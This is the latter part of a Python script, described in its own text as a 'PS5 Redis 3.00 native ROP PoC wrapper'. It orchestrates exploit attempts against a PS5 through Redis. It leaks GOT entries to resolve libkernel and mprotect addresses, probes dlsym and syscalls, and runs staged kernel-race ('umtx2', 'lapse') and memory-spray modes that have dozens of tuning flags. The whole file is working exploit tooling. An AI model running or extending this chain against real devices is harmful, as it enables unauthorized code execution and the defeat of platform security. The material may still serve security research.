    sys_item = next((item for item in resolved if item["image"] == "libkernel_sys.prx"), None)
    kernel_item = next((item for item in resolved if item["image"] == "libkernel.prx"), None)
    print("\n[resolve] copy/paste values:")
    if kernel_item and kernel_item["page_consensus"]:
        print(f"  libkernel_base=0x{kernel_item['page_base']:016X}")
        print(f"  libkernel_mprotect=0x{kernel_item['mprotect']:016X}")
    if sys_item and sys_item["page_consensus"]:
        print(f"  libkernel_sys_base=0x{sys_item['page_base']:016X}")
        print(f"  libkernel_sys_mprotect=0x{sys_item['mprotect']:016X}")
        print(f"  --libkernel-sys-base 0x{sys_item['page_base']:X}")

    if out_json is not None:
        out_json.parent.mkdir(parents=True, exist_ok=True)
        payload = {
            "got_leaks": leaks,
            "resolved": resolved,
        }
        out_json.write_text(json.dumps(payload, indent=2, sort_keys=True), encoding="utf-8")
        print(f"[resolve] wrote {out_json}")
    return any(item["page_consensus"] for item in resolved)


def run_mode(args, mode):
    layout_fillers = parse_layout_fillers(args.layout_fillers)
    if len(layout_fillers) > 1:
        print(f"[layout] filler search order: {', '.join(str(x) for x in layout_fillers)}")

    case_no = 0
    total_cases = args.attempts * len(layout_fillers)
    for attempt in range(1, args.attempts + 1):
        for filler in layout_fillers:
            case_no += 1
            token = random.randrange(0, 1 << 31)
            prefix = make_prefix(mode, case_no, token)
            raw_path = args.out_dir / f"poc_{mode}_{case_no}_fill{filler}.bin"
            log_path = args.out_dir / f"poc_{mode}_{case_no}_fill{filler}.out"
            try:
                raw_path.unlink(missing_ok=True)
            except TypeError:
                if raw_path.exists():
                    raw_path.unlink()

            print(
                f"\n=== {mode} attempt {attempt}/{args.attempts} "
                f"layout-fillers={filler} case {case_no}/{total_cases} ==="
            )
            if mode == "send":
                cmd = build_send_command(args, prefix, raw_path, filler)
            elif mode in ("got-leak", "libkernel"):
                cmd = build_got_leak_command(args, prefix, raw_path, filler)
            elif mode == "dlsym-probe":
                cmd = build_dlsym_probe_command(args, prefix, raw_path, filler)
            elif mode == "module-dlsym-probe":
                cmd = build_module_dlsym_probe_command(args, prefix, raw_path, filler)
            elif mode == "module-table-leak":
                cmd = build_module_table_leak_command(args, prefix, raw_path, filler)
            elif mode == "dynlib-list":
                cmd = build_dynlib_list_command(args, prefix, raw_path, filler)
            elif mode == "self-dlsym-probe":
                cmd = build_self_dlsym_probe_command(args, prefix, raw_path, filler)
            elif mode == "self-info-leak":
                cmd = build_self_info_leak_command(args, prefix, raw_path, filler)
            elif mode in ("mprotect-probe", "syscall-probe", "mprotect-derive", "syscall-derive"):
                cmd = build_mprotect_probe_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode in ("mprotect-derive", "syscall-derive"),
                )
            elif mode == "indirect-send":
                cmd = build_indirect_send_command(args, prefix, raw_path, filler)
            elif mode in ("libc-gettimeofday", "libc-gettimeofday-derive"):
                cmd = build_libc_gettimeofday_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode == "libc-gettimeofday-derive",
                )
            elif mode in ("libc-getpid", "libc-getpid-derive"):
                cmd = build_libc_getpid_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode == "libc-getpid-derive",
                )
            elif mode in ("eboot-getpid", "eboot-getpid-derive", "syscall-wrapper"):
                cmd = build_eboot_getpid_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode == "eboot-getpid-derive",
                )
            elif mode in ("eboot-gettimeofday", "eboot-gettimeofday-derive"):
                cmd = build_eboot_gettimeofday_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode == "eboot-gettimeofday-derive",
                )
            elif mode in ("eboot-mprotect", "eboot-mprotect-derive"):
                cmd = build_eboot_mprotect_command(
                    args,
                    prefix,
                    raw_path,
                    filler,
                    derive_only=mode == "eboot-mprotect-derive",
                )
            elif mode == "wrapper-call":
                cmd = build_wrapper_call_command(args, prefix, raw_path, filler)
            elif mode == "direct-syscall":
                cmd = build_direct_syscall_command(args, prefix, raw_path, filler)
            elif mode == "umtx2-preflight":
                cmd = build_umtx2_preflight_command(args, prefix, raw_path, filler)
            elif mode == "umtx2-wrapper-preflight":
                cmd = build_umtx2_wrapper_preflight_command(args, prefix, raw_path, filler)
            elif mode == "umtx2-race-one":
                cmd = build_umtx2_race_one_command(args, prefix, raw_path, filler)
            elif mode == "umtx2-spray-existing":
                cmd = build_umtx2_spray_existing_command(args, prefix, raw_path, filler)
            elif mode == "lapse-preflight":
                cmd = build_lapse_preflight_command(args, prefix, raw_path, filler)
            elif mode == "lapse-thread":
                cmd = build_lapse_thread_command(args, prefix, raw_path, filler)
            elif mode == "lapse-thread-ret":
                cmd = build_lapse_thread_command(args, prefix, raw_path, filler, start="ret")
            elif mode == "lapse-thread-setcontext":
                cmd = build_lapse_thread_command(args, prefix, raw_path, filler, start="setcontext")
            elif mode == "lapse-thread-pivot":
                cmd = build_lapse_thread_command(args, prefix, raw_path, filler, start="pivot")
            elif mode == "lapse-worker":
                cmd = build_lapse_worker_command(args, prefix, raw_path, filler)
            elif mode == "lapse-suspend":
                cmd = build_lapse_suspend_command(args, prefix, raw_path, filler)
            elif mode == "lapse-race-one":
                cmd = build_lapse_race_one_command(args, prefix, raw_path, filler)
            elif mode == "lapse-race-copy":
                cmd = build_lapse_race_copy_command(args, prefix, raw_path, filler)
            elif mode == "lapse-rthdr":
                cmd = build_lapse_rthdr_command(args, prefix, raw_path, filler)
            elif mode == "lapse-race-rthdr":
                cmd = build_lapse_race_rthdr_command(args, prefix, raw_path, filler)
            elif mode == "lapse-thread-none":
                cmd = build_lapse_thread_command(args, prefix, raw_path, filler, start="none")
            elif mode == "code-read":
                cmd = build_code_read_command(args, prefix, raw_path, filler)
            elif mode == "sandbox-probe":
                cmd = build_sandbox_probe_command(args, prefix, raw_path, filler)
            elif mode == "notify":
                cmd = build_notify_command(args, prefix, raw_path, filler)
            else:
                raise RuntimeError(f"unknown mode {mode!r}")
            try:
                rc = run_tee(cmd, log_path, args.attempt_timeout)
                print(f"[attempt] rc={rc} log={log_path} raw={raw_path}")
            except Exception as exc:
                print(f"[attempt] failed: {exc}")
            finally:
                restore_hll_config(args.host, args.port)

            if mode == "send" and check_send(raw_path):
                return True
            if mode == "indirect-send" and check_indirect_send(raw_path):
                return True
            if mode in ("libc-gettimeofday", "libc-gettimeofday-derive") and check_libc_gettimeofday(
                raw_path,
                derive_only=mode == "libc-gettimeofday-derive",
            ):
                return True
            if mode in ("libc-getpid", "libc-getpid-derive") and check_libc_getpid(
                raw_path,
                derive_only=mode == "libc-getpid-derive",
            ):
                return True
            if mode in ("eboot-getpid", "eboot-getpid-derive", "syscall-wrapper") and check_eboot_getpid(
                raw_path,
                derive_only=mode == "eboot-getpid-derive",
            ):
                return True
            if mode in ("eboot-gettimeofday", "eboot-gettimeofday-derive") and check_eboot_gettimeofday(
                raw_path,
                derive_only=mode == "eboot-gettimeofday-derive",
            ):
                return True
            if mode in ("eboot-mprotect", "eboot-mprotect-derive") and check_eboot_mprotect(
                raw_path,
                derive_only=mode == "eboot-mprotect-derive",
            ):
                return True
            if mode == "wrapper-call" and check_wrapper_call(raw_path, args):
                return True
            if mode == "direct-syscall" and check_direct_syscall(raw_path, args):
                return True
            if mode in ("umtx2-preflight", "umtx2-wrapper-preflight") and check_umtx2_preflight(raw_path):
                return True
            if mode == "umtx2-race-one" and check_umtx2_race_one(raw_path):
                return True
            if mode == "umtx2-spray-existing" and check_umtx2_spray_existing(raw_path, args):
                return True
            if mode == "lapse-preflight" and check_lapse_preflight(raw_path):
                return True
            if mode == "lapse-thread" and check_lapse_thread(raw_path):
                return True
            if mode == "lapse-thread-ret" and check_lapse_thread(raw_path, expect_marker=False):
                return True
            if mode == "lapse-thread-setcontext" and check_lapse_thread(raw_path):
                return True
            if mode == "lapse-thread-pivot" and check_lapse_thread(raw_path, require_libc=False):
                return True
            if mode == "lapse-worker" and check_lapse_worker(raw_path):
                return True
            if mode == "lapse-suspend" and check_lapse_suspend(raw_path):
                return True
            if mode == "lapse-race-one" and check_lapse_race_one(raw_path):
                return True
            if mode == "lapse-race-copy" and check_lapse_race_one(raw_path):
                return True
            if mode == "lapse-rthdr" and check_lapse_rthdr(raw_path, args):
                return True
            if mode == "lapse-race-rthdr" and check_lapse_race_rthdr(raw_path, args):
                return True
            if mode == "lapse-thread-none" and check_lapse_thread(raw_path, expect_marker=False, require_thread=False):
                return True
            if mode == "code-read" and check_code_read(raw_path, args):
                return True
            if mode == "sandbox-probe" and check_sandbox_probe(raw_path, args):
                return True
            if mode == "notify" and check_notify(raw_path):
                return True
            if mode == "got-leak" and check_got_leak(raw_path):
                return True
            if mode == "libkernel":
                leaks, data = parse_got_leak(raw_path)
                if leaks is None:
                    print(f"[check] libkernel short read: {len(data)} bytes")
                    continue
                json_path = args.out_dir / f"poc_{mode}_{case_no}_fill{filler}.json"
                if print_libkernel_resolution(leaks, json_path):
                    return True
            if mode == "dlsym-probe" and check_dlsym_probe(raw_path, args):
                return True
            if mode == "module-dlsym-probe" and check_module_dlsym_probe(raw_path, args):
                return True
            if mode == "module-table-leak" and check_module_table_leak(raw_path, args):
                return True
            if mode == "dynlib-list" and check_dynlib_list(raw_path, args):
                return True
            if mode == "self-dlsym-probe" and check_self_dlsym_probe(raw_path, args):
                return True
            if mode == "self-info-leak" and check_self_info_leak(raw_path, args):
                return True
            if mode in ("mprotect-probe", "syscall-probe", "mprotect-derive", "syscall-derive") and check_mprotect_probe(
                raw_path,
                derive_only=mode in ("mprotect-derive", "syscall-derive"),
            ):
                return True
    return False


def resolve_previous_got(args):
    raw_path = args.from_got
    leaks, data = parse_got_leak(raw_path)
    if leaks is None:
        print(f"[check] got-leak short read from {raw_path}: {len(data)} bytes")
        return False
    json_path = args.out_dir / f"{raw_path.stem}_libkernel.json"
    return print_libkernel_resolution(leaks, json_path)


def main():
    ap = argparse.ArgumentParser(description="PS5 Redis 3.00 native ROP PoC wrapper")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument(
        "--mode",
        choices=(
            "send",
            "got-leak",
            "libkernel",
            "dlsym-probe",
            "module-dlsym-probe",
            "module-table-leak",
            "dynlib-list",
            "self-dlsym-probe",
            "self-info-leak",
            "mprotect-probe",
            "syscall-probe",
            "mprotect-derive",
            "syscall-derive",
            "indirect-send",
            "libc-getpid",
            "libc-getpid-derive",
            "eboot-getpid",
            "eboot-getpid-derive",
            "eboot-gettimeofday",
            "eboot-gettimeofday-derive",
            "eboot-mprotect",
            "eboot-mprotect-derive",
            "libc-gettimeofday",
            "libc-gettimeofday-derive",
            "syscall-wrapper",
            "wrapper-call",
            "direct-syscall",
            "umtx2-preflight",
            "umtx2-wrapper-preflight",
            "umtx2-race-one",
            "umtx2-spray-existing",
            "lapse-preflight",
            "lapse-thread",
            "lapse-thread-ret",
            "lapse-thread-setcontext",
            "lapse-thread-pivot",
            "lapse-worker",
            "lapse-suspend",
            "lapse-race-one",
            "lapse-race-copy",
            "lapse-rthdr",
            "lapse-race-rthdr",
            "lapse-thread-none",
            "code-read",
            "sandbox-probe",
            "notify",
            "both",
        ),
        default="both",
    )
    ap.add_argument("--notify-text", default="Redis ROP notification")
    ap.add_argument("--attempts", type=int, default=5)
    ap.add_argument("--closures", type=int, default=2048)
    ap.add_argument("--eggs", type=int, default=512)
    ap.add_argument("--lapse-rthdr-count", type=int, default=1)
    ap.add_argument("--lapse-rthdr-set-loops", type=lambda x: int(x, 0), default=1)
    ap.add_argument("--lapse-rthdr-skip-reclaim", action="store_true")
    ap.add_argument("--lapse-rthdr-per-socket-setbuf", action="store_true")
    ap.add_argument("--lapse-rthdr-segment-floor-override", type=lambda x: int(x, 0))
    ap.add_argument("--lapse-prezero-r9-once", action="store_true")
    ap.add_argument("--lapse-skip-rthdr-optlen-store", action="store_true")
    ap.add_argument("--lapse-target-req-index", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lapse-post-resume-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-post-resume-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-post-resume-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-worker-ack", action="store_true")
    ap.add_argument("--lapse-worker-ack-poll-ms", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-worker-ready-ack", action="store_true")
    ap.add_argument("--lapse-worker-ready-pipe", action="store_true")
    ap.add_argument("--lapse-worker-after-read-ack", action="store_true")
    ap.add_argument("--lapse-worker-park", action="store_true")
    ap.add_argument("--lapse-pre-reclaim-send", action="store_true")
    ap.add_argument("--lapse-post-reclaim-send", action="store_true")
    ap.add_argument("--lapse-post-main-delete-send", action="store_true")
    ap.add_argument("--lapse-pre-delete-send", action="store_true")
    ap.add_argument("--lapse-tcpinfo-before-poll", action="store_true")
    ap.add_argument("--lapse-debug-sends", action="store_true")
    ap.add_argument("--lapse-after-ack-send", action="store_true")
    ap.add_argument("--lapse-block-workers", action="store_true")
    ap.add_argument("--lapse-block-worker-count", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lapse-pre-barrier-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-barrier-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-barrier-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-barrier-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-suspend-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-post-poll-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-post-poll-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-client-fill-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-sockbuf-size", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-conn-drain-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-suspend-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-pre-suspend-yield", action="store_true")
    ap.add_argument("--lapse-pre-suspend-yields", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-pre-suspend-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-main-prio-pin", action="store_true")
    ap.add_argument("--lapse-cpuset-size", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lapse-stack-size-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-copy-len-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-msg-offset-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-raw-max-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-vtable-offset-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-chain-offset-override", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lapse-allow-uncopied-msg-tail", action="store_true")
    ap.add_argument("--lapse-truncate-msg-tail", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lapse-external-msg", action="store_true")
    ap.add_argument("--lapse-external-msg-size", type=lambda x: int(x, 0), default=0x10000)
    ap.add_argument("--lapse-external-msg-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lapse-external-msg-align", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--lapse-rthdr-require-alias", action="store_true")
    ap.add_argument("--lapse-require-worker-done", action="store_true")
    ap.add_argument(
        "--layout-fillers",
        default="15",
        help="single filler count, comma list, range like 8..20, or 'auto'",
    )
    ap.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x1000000)
    ap.add_argument("--flag-search-span", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--raw-timeout", type=float, default=2.0)
    ap.add_argument("--attempt-timeout", type=float, default=240.0)
    ap.add_argument("--out-dir", type=Path, default=Path("poc_runs"))
    ap.add_argument("--dlsym-handles", default=None, help="comma list for dlsym-probe handles")
    ap.add_argument("--dlsym-symbols", default=None, help="comma list for dlsym-probe symbols")
    ap.add_argument("--dlsym-module-names", default=None, help="comma list for module-dlsym-probe names")
    ap.add_argument("--module-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--module-table-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--module-table-entries", type=lambda x: int(x, 0), default=12)
    ap.add_argument("--dynlib-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--dynlib-list-max", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--dynlib-capture-errno", action="store_true")
    ap.add_argument(
        "--dynlib-list-order",
        choices=("handles-max-count", "count-handles-max", "handles-count-max"),
        default="handles-max-count",
    )
    ap.add_argument("--self-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--mprotect-len", type=lambda x: int(x, 0), default=0x4000)
    ap.add_argument("--mprotect-prot", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--mprotect-addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--mprotect-target", choices=("scratch", "stack"), default="scratch")
    ap.add_argument("--mprotect-capture-errno", action="store_true")
    ap.add_argument("--eboot-mprotect-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--wrapper-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--wrapper-source", choices=("getpid", "gettimeofday", "send"), default="getpid")
    ap.add_argument("--wrapper-offset", type=lambda x: int(x, 0), default=LIBKERNEL_SYS_GETPID)
    ap.add_argument("--wrapper-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--wrapper-prezero-r8-r9", action="store_true")
    ap.add_argument("--wrapper-capture-errno", action="store_true")
    ap.add_argument("--wrapper-use-libc-call8", action="store_true")
    ap.add_argument("--wrapper-call8-send-self", action="store_true")
    ap.add_argument("--wrapper-use-setcontext", action="store_true")
    ap.add_argument("--wrapper-setcontext-offset", type=lambda x: int(x, 0), default=0x412F8)
    ap.add_argument("--wrapper-no-save-context", action="store_true")
    ap.add_argument("--wrapper-setcontext-ping-only", action="store_true")
    ap.add_argument("--wrapper-setcontext-send-only", action="store_true")
    ap.add_argument("--wrapper-setcontext-call-rax", action="store_true")
    ap.add_argument("--wrapper-setcontext-pivot-only", action="store_true")
    ap.add_argument("--wrapper-preflight-send", action="store_true")
    for _i in range(1, 7):
        ap.add_argument(f"--wrapper-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--wrapper-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--wrapper-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--direct-syscall-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--direct-syscall-source", choices=("getpid", "gettimeofday"), default="gettimeofday")
    ap.add_argument("--direct-syscall-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--direct-syscall-landing-adjust", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--direct-syscall-num", type=lambda x: int(x, 0), default=20)
    ap.add_argument("--direct-syscall-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--direct-syscall-capture-errno", action="store_true")
    ap.add_argument("--direct-syscall-sixargs", action="store_true")
    ap.add_argument("--umtx2-existing-fd", type=lambda x: int(x, 0), default=24)
    ap.add_argument("--umtx2-spray-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--umtx2-inline-spray-count", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--umtx2-preserve-lookup-fd", action="store_true")
    ap.add_argument("--umtx2-worker-spray", action="store_true")
    ap.add_argument("--umtx2-worker-spray-gate", action="store_true")
    ap.add_argument("--umtx2-worker-spray-post-yields", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--umtx2-main-tag-worker-fds", action="store_true")
    ap.add_argument("--umtx2-race-debug", action="store_true")
    ap.add_argument("--umtx2-destroy-delay-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--umtx2-destroy-delay-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--umtx2-destroy-pad-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--umtx2-destroy-pad-count", type=lambda x: int(x, 0), default=0)
    for _i in range(1, 7):
        ap.add_argument(f"--direct-syscall-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--direct-syscall-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--direct-syscall-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--direct-syscall-arg{_i}-stack-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--direct-syscall-arg{_i}-stack-page-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--code-read-source", choices=("getpid", "gettimeofday", "send", "sceKernelDlsym", "memcpy", "libc-getpid", "libc-gettimeofday", "msg"), default="gettimeofday")
    ap.add_argument("--code-read-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--code-read-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--code-read-adjust", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--code-read-len", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--code-read-msg-len", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--sandbox-path", action="append", default=None)
    ap.add_argument("--sandbox-max-paths", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--sandbox-open-flags", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--send-export-offset", type=lambda x: int(x, 0), default=0x13270)
    ap.add_argument("--syscall-offset", type=lambda x: int(x, 0), default=0x900)
    ap.add_argument(
        "--from-got",
        type=Path,
        default=None,
        help="resolve libkernel from an existing got-leak raw .bin without touching Redis",
    )
    ap.add_argument(
        "--fast",
        action="store_true",
        help="use the current fast notify profile: closures=512, scan-size=0x400000, raw-timeout=2",
    )
    args = ap.parse_args()
    if args.fast:
        args.closures = 512
        args.scan_size = 0x400000
        args.raw_timeout = min(args.raw_timeout, 2.0)

    if args.from_got is not None:
        return 0 if resolve_previous_got(args) else 1

    modes = ["send", "got-leak"] if args.mode == "both" else [args.mode]
    results = {}
    for mode in modes:
        results[mode] = run_mode(args, mode)

    print("\n=== SUMMARY ===")
    for mode, ok in results.items():
        print(f"{mode}: {'OK' if ok else 'FAILED'}")
    return 0 if all(results.values()) else 1


if __name__ == "__main__":
    raise SystemExit(main())
